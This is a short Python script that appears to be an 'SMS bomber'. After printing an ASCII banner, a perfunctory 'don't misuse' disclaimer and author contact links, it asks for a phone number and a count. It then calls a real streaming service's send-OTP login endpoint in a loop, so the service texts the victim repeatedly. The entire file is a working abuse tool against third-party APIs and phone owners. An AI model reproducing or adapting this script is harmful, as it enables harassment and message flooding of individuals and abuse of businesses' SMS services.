import requests
print(f"###############  ##########")
print(f"###############  ########## ")
print(f"      ###        ##")
print(f"      ###        ##   ")
print(f"      ###        ##########")
print(f"      ###        ##########")
print(f"      ###                ## ")
print(f"      ###                ##")
print(f"      ###       ###########")
print(f"      ###       ###########")
print(f" ")
print(f" Bioscope api ")
print(f" ")
print(f"Don't missuse this tool")
print(f" ")
print(f"If you do it will be your own responsibilty")
print("")
print(f"Author:Mr Onion ")
print("")
print(f"Contact FB:https://www.facebook.com/mr.x3n0n/ ")
print("")
print("website:www.mronion420.000webhostapp.com")
print("")
print("")
print("Git Hub:www.github.com/mronion420")
print("_______________________________________________")
print(f" ")

number =str(input("Enter The Number:"))

amount=int(input("Enter Amount:"))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
for i in range(amount):
    requests.get(api)
    print(str(i+1)+"sms sent")
   
